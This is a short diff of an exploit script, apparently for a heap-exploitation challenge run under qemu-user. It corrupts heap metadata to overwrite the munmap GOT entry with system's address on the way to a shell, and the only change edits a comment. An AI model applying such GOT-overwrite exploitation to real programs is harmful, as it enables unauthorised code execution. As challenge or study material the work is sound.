@@ -63,7 +63,7 @@ def exp():
     delete(0)
     vuln(b"A"*(0x208-2)+p64(0x31)+p64(munmap_got-0x10+5))
     write(5, 0x20, b"C"*0x20)
-    write(6, 0x20, p64(system)[5:].ljust(0x20, b"\x00")) #get munmap_got (qemu-user only)
+    write(6, 0x20, p64(system)[5:].ljust(0x20, b"\x00")) #get munmap_got place (qemu-user only)
     
     
     ## getshell
